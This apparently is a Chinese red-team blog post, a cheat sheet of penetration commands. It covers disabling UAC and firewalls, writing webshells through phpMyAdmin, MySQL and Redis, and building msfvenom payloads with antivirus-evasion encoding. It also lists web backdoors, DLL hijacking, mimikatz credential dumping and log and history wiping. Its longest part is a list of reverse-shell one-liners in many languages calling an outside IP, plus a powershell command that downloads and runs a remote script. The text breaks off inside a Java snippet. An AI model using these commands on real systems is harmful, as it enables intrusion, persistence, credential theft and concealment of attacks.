---
layout: post
title: 渗透点备忘录
subtitle: 持续更新
bigimg: /img/path.jpg
tags: [Red-Team]
---

本文将日常工作学习中常用的渗透利用点记录如下:


端口信息:
查看本机3389是否开放(普通权限即可)
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
fDenyTSConnections    REG_DWORD    0x1 为未开放
查看本机rdp监听端口(普通权限即可)
shell REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
开启命令(需管理员权限)
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
Meterpreter：Run post/windows/manage/enable_rdp

masscan 192.168.0.100 -p 1-10000 --rate=1000

msf内网代理转发:
meterpreter > run autoroute -s 192.168.244.0/24 //meterpreter > route flush  清除路由
run post/windows/gather/arp_scanner RHOSTS=192.168.244.0/24
background
msf exploit(handler) > use auxiliary/server/socks4a 
msf auxiliary(socks4a) > set srvhost 127.0.0.1
msf auxiliary(socks4a) > set srvport 1080
msf auxiliary(socks4a) > run
vi /etc/proxychains.conf
socks4 127.0.0.1 1080
proxychains hydra -l root -P pass.txt -f -t 20 ssh://xx.xx.xx.xx

handler
setg Proxies socks4:127.0.0.1:22222
setg ReverseAllowProxy true

系统补丁:
wmic qfe list

UAC:
注册表关闭UAC
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t reg_dword /d 0 /F
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t reg_dword /d 0 /F
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t reg_dword /d 0 /F

cs:
Ladon ip PortScan
Portscan 网段 端口 协议（icmp arp none）线程
域内存活主机:
Ladon ip段 OnlinePC
域内操作系统:
Ladon ip段 OsScan

防火墙规则:
netsh advfirewall firewall add rule name=cs dir=in action=allow protocol=TCP localport=6666
netsh advfirewall set allprofiles state off

主机发现:
netdiscover -i eth0 -r 192.168.72.0/24

phpmyadmin:
日志文件getshell
show variables like '%general%';
SET GLOBAL general_log='on'
SET GLOBAL general_log_file='C:/phpStudy/www/233.php'
SELECT '<?php eval($_POST["cmd"]);?>'

BloodHound
SharpHound.exe -c all

目录爆破:
dirb http://192.168.0.100 wordlists/common.txt -o result.txt
Dirbuster

web banner信息:
curl -I ip 

wp扫描:
wpscan http://192.168.0.100/wordpress

smb信息枚举:
enum4linux -U -o 192.168.1.200

windows获取共享资源:
net use z: \\ip\share$

linux获取共享资源:
mount -t cifs -o username='',password='' //192.168.0.100/share$ /mnt

linux主机信息:
uname -r 
lsb_release -a
cat /etc/issue

shell:
webshell反弹系统shell:(需url编码)
echo "bash -i >& /dev/tcp/10.95.14.221/1234 0>&1" | bash

提权:
配置文件、数据库连接文件、用户的文件
已知本地提权漏洞

打印图片中可打印字符:
kali strings xx.jpg >> images.txt
exiftool.exe xx.jpg

文件写入:
cat xx.txt | tee target.sh 覆盖

ssl证书解密流量:
keytool.exe -list -keystore c:\keystore 输入密钥库口令
密钥库导出证书
keytool.exe -importkeystore -srckeystore keystore -destkeystore xx.p12 -deststoretype PKCS12 -srcalias tomcat
wireshark打开pcap包并导入SSL证书

tomcat getshell:
将jsp马压缩成xx.zip后将其改名为xx.war上传
菜刀直连

主机探测:
nmap -sP IP段
nmap -sS -sV -O IP段

XSS:
" /><svg onload=alert(1)>

SSH流量转发:
vi/etc/ssh/sshd_config
AllowTcpForwarding yes  GatewayPorts yes  TCPKeepAlive yes  PasswordAuthentication yes

win主机信息收集
密码收集:
主机本地存储密码 lazagne.exe all
补丁信息:
msf run post/windows/gather/enum_patches
软件信息:
msf run post/windows/gather/enum_applications
网段探测:
msf run post/windows/gather/arp_scanner RHOSTS=XX.XX.XX.0/24
主机所在域:
msf mimikatz_command -f system::computer
msf mimikatz_command -f samdump::hashes

SMTP服务器中转:
telnet ip 25
HELO hello
mail from:<xx@xx.com>
rcpt to:<yy@yy.com>
data
from:display@cc.com
to:yy@yy.com
subject:test
test
.
quit

DKIM邮件签名:
邮件源文件DKIM头中s字段为selector的值
DKIM服务器域名 selector._domainkey.xxx.com
查找公开密钥 nslookup -type=txt s1024._domainkey.aliyun.com

DMARC电子邮件认证协议:
通常情况下，它与SPF或DKIM结合使用，并告知收件方服务器当未通过SPF或 DKIM检测时该如何处理
nslookup -type=txt _dmarc.aliyun.com
none	不采取特定措施
quarantine	邮件接收者将DMARC验证失败的邮件标记为可疑的。
reject	域名所有者希望邮件接收者将DMARC验证失败的邮件拒绝
pct=：域名所有者邮件流中应用DMARC策略的消息百分比。
rua=：用于接收消息反馈的邮箱。 

redis getshell:
1.通过写SSH key的方式进行getshell 
生成密钥对
ssh-keygen -t rsa
将生成的公钥写入到文件中
(echo -e "\n\n\n"; cat id_rsa.pub; echo -e "\n\n\n") > pub.txt
设置路径、文件、写入公钥 
config set dir /root/.ssh/
config set dbfilename "authorized_keys"
save
exit
连接
ssh -i id_rsa root@192.168.2.155
2.通过写SSH key的方式进行getshell 
生成密钥对
ssh-keygen -t rsa
将生成的公钥写入到文件中
(echo -e "\n\n\n"; cat id_rsa.pub; echo -e "\n\n\n") > pub.txt
设置路径、文件、写入公钥 
config set dir /root/.ssh/
config set dbfilename "authorized_keys"
save
exit
连接
ssh -i id_rsa root@192.168.2.155
3.redis写定时任务反弹shell
config set dir /var/spool/cron/
config set dbfilename root
set x "\n* * * * * bash -i >& /dev/tcp/192.168.2.155/2333 0>&1\n"
save

代理转发:
HTTP Service reGeorgSocksProxy.py

C2通信:
https://github.com/threatexpress/cs2modrewrite
https://github.com/rsmudge/Malleable-C2-Profiles

痕迹清理:
Elsave可用于远程清除Windows日志文件，也可以备份远程日志文件。
Clearlog.exe
脚本工具停止系统日志记录
https://github.com/3gstudent/Windows-EventLog-Bypass
https://github.com/hlldz/Invoke-Phant0m

敏感文件路径:
Windows：
   C:\boot.ini  //查看系统版本
   C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件
   C:\Windows\repair\sam  //存储系统初次安装的密码
   C:\Program Files\mysql\my.ini  //Mysql配置
   C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root
   C:\Windows\php.ini  //php配置信息
   C:\Windows\my.ini  //Mysql配置信息

Linux：
   /root/.ssh/authorized_keys
   /root/.ssh/id_rsa
   /root/.ssh/id_ras.keystore
   /root/.ssh/known_hosts
   /etc/passwd
   /etc/shadow
   /etc/my.cnf
   /etc/httpd/conf/httpd.conf
   /root/.bash_history
   /root/.mysql_history
   /proc/self/fd/fd[0-9]*(文件标识符)
   /proc/mounts
   /porc/config.gz

msfvenom:
msfvenom -p payload --list-options
msfvenom --list payloads
msfvenom --list encoders
msfvenom --list nops
msfvenom --list platforms
msfvenom --list archs
msfvenom --list encrypt
msfvenom --list formats

msf exploit(multi/handler) > set ExitOnSession false   //可以在接收到seesion后继续监听端口，保持侦听。
msf5 exploit(multi/handler) > set SessionCommunicationTimeout 0  //默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0
msf5 exploit(multi/handler) > set SessionExpirationTimeout 0 //默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭
msf exploit(multi/handler) > exploit -j -z //-j为后台任务，-z为持续监听
msf5 > handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/reverse_tcp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o  shell.exe  //生成的shell程序执行后会启动两个进程shell.exe和svchost.exe，关闭其中一个不会影响会话状态。唯一美中不足的是svchost.exe不是system32目录下的。

绕过杀软:
msfvenom -p windows/meterpreter/reverse_https lhost=10.211.55.2 lport=3333 -f c
msf exploit(multi/handler) > set EnableStageEncoding true   //尝试使用不同的编码器对stage进行编码，可能绕过部分杀软的查杀
EnableStageEncoding => true
msf exploit(multi/handler) > set stageencoder x86/fnstenv_mov
Stageencoder => x64/xor
msf exploit(multi/handler) > set stageencodingfallback false
stageencodingfallback => false

msfvenom -p  windows/meterpreter/reverse_tcp_rc4  lhost=10.211.55.2 lport=3333 RC4PASSWORD=password  -f c
在监听的服务端设置相同的密钥

各平台payload
windows:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f exe > shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f exe > shell.exe

linux:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f elf > shell.elf

mac:
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f macho > shell.macho

android:
msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw > shell.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 R > test.apk

powershell:
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1

nc:
msfvenom -p windows/shell_hidden_bind_tcp LHOST=10.211.55.2 LPORT=3333  -f exe> 1.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333  -f exe> 1.exe

shellcode
Linux Shellcode:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f c
Windows Shellcode:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f c
Mac Shellcode:
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f c

脚本:
python reverse shell:
msfvenom -p cmd/unix/reverse_python LHOST=10.211.55.2 LPORT=3333 -f raw > shell.py
msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw > shell.py

python bind shell:
python/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.211.55.2",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
python/python3 -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(("10.211.55.2",3333))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"

bash:
msfvenom -p cmd/unix/reverse_bash LHOST=10.211.55.2 LPORT=3333 -f raw > shell.sh

perl:
msfvenom -p cmd/unix/reverse_perl LHOST=10.211.55.2 LPORT=3333 -f raw > shell.pl

lua:
msfvenom -p cmd/unix/reverse_lua LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.lua

ruby:
msfvenom -p ruby/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.rb

WEB
PHP:
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw > shell.php
cat shell.php | pb------------------------ && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASPX:
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f aspx -o shell.aspx

ASP:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f asp > shell.asp

JSP:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw > shell.jsp

WAR:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f war > shell.war

nodejs:
msfvenom -p nodejs/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.js


Handlers:
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST 10.211.55.2
set LPORT 3333
set ExitOnSession false
exploit -j -z

dll劫持:
process monitor监控exe调用的dll
通过CFF Explorer查看导入的dll列表
选择其中的dll查看其包含的函数
编写dll
1.
extern "C"
{
    _declspec(dllexport) void funcname();
}
2.
_declspec(dllexport) void funcname()
{
    WinExec("evil.exe",SW_SHOW);
}
添加xx.def文件
LIBRARY
EXPORTS
funcname
在链接器 输入 模块定义文件 添加xx.def
代码生成 MT
编译dll

ssh密钥解密:
ssh2john.py id_rsa > ssh.txt
john ssh.txt --wordlist=../../wordlists/rockyou.txt

hashcat:
linux hash david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ hashcat -m 500 -a 0 hash.txt ./wordlists/rockyou.txt

docker login https://xx.xx.xx
安装证书ca.crt

curl --user admin:admin https://xx.xx.xx/_catalog
{“repositories”:[“bolt-image”]}
docker image pull docker.registry.htb/bolt-image
docker image ls
docker run -it docker.registry.htb/bolt-image /bin/bash
docker ps -alq
docker cp f7f8fc1f7f17:/root/.ssh/id_rsa .

web后门:
1.fastcgi运行php 配置.user.ini 插入auto_prepend_file=evil.txt 访问当前目录下所有php文件时自动包含evil.txt文件
2..htaccess
站长经常用.htaccess做伪静态，我们也可以拿来做后门。
自定义.htaccess上传，下面是内容
<FileMatch "aaa">
SetHandler application/x-httpd-php
</FileMatch>
同目录下，上传一个名称包含aaa的文件，就可以把此文件当成php解析。
3.php.ini
修改php.ini，添加如下内容：
allow_url_include=On
auto_prepend_file="data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pOz8+"
重启php后，访问任意php页面都可以自动包含上述webshell，即解码后的
<?php @eval($_REQUEST[cmd]);?>
4.php环境变量include_path目录中创建evil.txt 在网站根目录上传php文件<?php include('evil.txt');?>
5.aspx
C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_compiler.exe -v / -p c:\Users\Jumbo\Desktop\aspxceshi\webshell\ c:\Users\Jumbo\Desktop\aspxceshi\webshellbin\
在webshellbin目录生成dll文件
复制compiled文件中assembly值和type值
修改web.config
<system.web>
    <httpHandlers>
        <add verb="*" path="*" type="assembly值, type值" validate="True"/>
    </httpHandlers>
</system.web>
将生成的dll放入网站bin目录
任意地址均为webshell

mysql写入webshell
1.union select
?id=1 union select 1,"<?php @eval($_POST['g']);?>",3 into outfile 'E:/study/WWW/evil.php'
?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile "E:/study/WWW/evil.php"
2.利用分隔符写入
?id=1 LIMIT 0,1 INTO OUTFILE 'E:/study/WWW/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --
?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
3.利用log写入
show variables like '%general%';             #查看配置
set global general_log = on;                 #开启general log模式
set global general_log_file = 'E:/study/WWW/evil.php'; #设置日志目录为shell地址
select '<?php eval($_GET[g]);?>'             #写入shell
set global general_log=off;                  #关闭general log模式

curl --socks5-hostname 127.0.0.1:1080 www.google.com
wget 只能使用 http 代理，而无法直接使用 socks 代理
1.proxychains wget www.google.com
2.apt-get install tsocks
cat /etc/tsocks.conf
server = 127.0.0.1
# Server type defaults to 4 so we need to specify it as 5 for this one
server_type = 5
# The port defaults to 1080 but I've stated it here for clarity 
server_port = 1080
tsocks wget www.google.com

shellcode加载方式
#include <iostream>
#include "stdio.h"
#include "Windows.h"
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") //去除窗口
unsigned char shellcode[] =
1.LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(Memory, shellcode, sizeof(shellcode));
((void(*)())Memory)();

mysql远程登录关闭 上传ntunnel php文件创建http隧道

dns-zone-transfer
nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=xxx.edu.cn -p 53 -Pn dns.xxx.edu.cn

32位机器:
32位的程序存储在C:\Program Files中，32位的dll存储在C:\System32
64位机器:
64位的程序存储在C:\Program Files中，64位的dll存储在C:\Windows\System32
32位的程序存储在C:\Program Files(x86)中，32位的dll存储在C:\Windows\SysWOW64

last显示/var/log/wtmp文件
lastb显示/var/log/btmp文件(需root权限)
配置文件vim /etc/logrotate.conf
清除登录记录(注意wtmp.1 btmp.1等历史文件)
echo ""> /var/log/wtmp
echo ""> /var/log/btmp

history:
history -c 清除所有历史记录
vim ~/.bash_history 修改历史记录存储文件
history -r 读取历史文件到内存

环境变量
shell c:\windows\system32\setx PATH "%path%;C:\WINDOWS\System32\"

procdump+mimikatz
mimikatz "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit

mysql命令行执行sql语句
mysql -uroot -pxxx mysql -e "select sys_eval('whoami');" 
123=system("mysql -uroot -pHfhtXd mysql -e \"select sys_eval('cat /etc/shadow');\" ");

cat /proc/bus/input/devices

/etc/profile 每个用户登录执行一次
~/.bash_profile 当前用户登录执行一次
/etc/bash.bashrc 每个用户打开shell就执行
~/.bashrc 当前用户打开shell就执行
~/.bash_logout 当前用户退出登录时执行

nikto -h http://www.target.com 
nikto -h www.target.com -p 443 -ssl -useproxy 127.0.0.1:1080

SSL证书查真实ip
https://censys.io/certificates?q=www.chasers.fun
https://censys.io/ipv4?q=42ee935ccab9f345e81c78c6d6b9124b8ef7b6356a1c2317ca0e56b4179c7ebb

shodan搜索favicon:
搜索ip
查看原始数据
查看data.0.http.favicon.hash的值
搜索http.favicon.hash:哈希值
data.0.http.favicon.data位icon的base64编码

import mmh3
import requests
response = requests.get('https://www.baidu.com/favicon.ico')
favicon = response.content.encode('base64')
hash = mmh3.hash(favicon)
print hash
搜索http.favicon.hash:哈希值

reverse shell
Bash TCP:
Victim:
bash -i >& /dev/tcp/123.59.170.204/443 0>&1
/bin/bash -i > /dev/tcp/123.59.170.204/443 0<& 2>&1
exec 5<>/dev/tcp/123.59.170.204/443;cat <&5 | while read line; do $line 2>&5 >&5; done
exec /bin/sh 0</dev/tcp/123.59.170.204/443 1>&0 2>&0
0<&196;exec 196<>/dev/tcp/123.59.170.204/443; sh <&196 >&196 2>&196
Bash UDP:
sh -i >& /dev/udp/123.59.170.204/443 0>&1
Listener:
nc -u -lvp 443

Netcat:
nc -e /bin/sh 123.59.170.204 443
------------------------
nc -e /bin/bash 123.59.170.204 443
------------------------
nc -c bash 123.59.170.204 443
------------------------
mknod backpipe p && nc 123.59.170.204 443 0<backpipe | /bin/bash 1>backpipe 
------------------------
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 123.59.170.204 443 >/tmp/f
------------------------
rm -f /tmp/p; mknod /tmp/p p && nc 123.59.170.204 443 0/tmp/p 2>&1
------------------------
rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 123.59.170.204 443 > f
------------------------
rm -f x; mknod x p && nc 123.59.170.204 443 0<x | /bin/bash 1>x

Ncat:
ncat 123.59.170.204 443 -e /bin/bash
------------------------
ncat --udp 123.59.170.204 443 -e /bin/bash

Telnet:
rm -f /tmp/p; mknod /tmp/p p && telnet 123.59.170.204 443 0/tmp/p 2>&1
------------------------
telnet 123.59.170.204 443 | /bin/bash | telnet 123.59.170.204 444
------------------------
rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet 123.59.170.204 443 > f
------------------------
rm -f x; mknod x p && telnet 123.59.170.204 443 0<x | /bin/bash 1>x
------------------------

Socat:
Victim:
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:123.59.170.204:443
------------------------
socat tcp-connect:123.59.170.204:443 exec:"bash -li",pty,stderr,setsid,sigint,sane
------------------------
Listener:
socat file:`tty`,raw,echo=0 TCP-L:443
------------------------
Victim:
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:123.59.170.204:443
------------------------

Perl:
Victim:
perl -e 'use Socket;$i="123.59.170.204";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
------------------------
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"123.59.170.204:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
------------------------
Windows only, Victim:
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"123.59.170.204:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
------------------------

Python:
IP v4
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("123.59.170.204",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
------------------------
export RHOST="123.59.170.204";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
------------------------
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("123.59.170.204",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
------------------------ IP v6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",443,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
------------------------ Windows only:
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('123.59.170.204', 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
------------------------
PHP:
php -r '$sock=fsockopen("123.59.170.204",443);exec("/bin/sh -i <&3 >&3 2>&3");'
------------------------
php -r '$s=fsockopen("123.59.170.204",443);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'
------------------------
php -r '$s=fsockopen("123.59.170.204",443);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
------------------------
php -r '$s=fsockopen("123.59.170.204",443);`/bin/sh -i <&3 >&3 2>&3`;'
------------------------
php -r '$s=fsockopen("123.59.170.204",443);system("/bin/sh -i <&3 >&3 2>&3");'
------------------------
php -r '$s=fsockopen("123.59.170.204",443);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
------------------------
php -r '$s=\'127.0.0.1\';$p=443;@error_reporting(0);@ini_set("error_log",NULL);@ini_set("log_errors",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\'/bin/sh$IFS-i\',array(array(\'pipe\',\'r\'),array(\'pipe\',\'w\'),array(\'pipe\',\'w\')),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\'connection/closed\');if(feof($p[1]))die(\'shell/not/response\');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die("proc_open/disabled");}}else{die("not/connect");}'
------------------------

Ruby:
ruby -rsocket -e'f=TCPSocket.open("123.59.170.204",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
------------------------
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("123.59.170.204","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
------------------------
NOTE: Windows only
ruby -rsocket -e 'c=TCPSocket.new("123.59.170.204","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
------------------------

OpenSSL:
Attacker:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
------------------------
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
------------------------ or
ncat --ssl -vv -l -p 443
------------------------ Victim:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 123.59.170.204:443 > /tmp/s; rm /tmp/s
------------------------

Powershell:
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("123.59.170.204",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
------------------------
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('123.59.170.204',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
------------------------
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
------------------------

Awk:
awk 'BEGIN {s = "/inet/tcp/0/123.59.170.204/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
------------------------

TCLsh
echo 'set s [socket 123.59.170.204 443];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
------------------------

Java:
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/123.59.170.204/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
------------------------
String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
------------------------
Thread thread = new Thread(){
    public void run(){
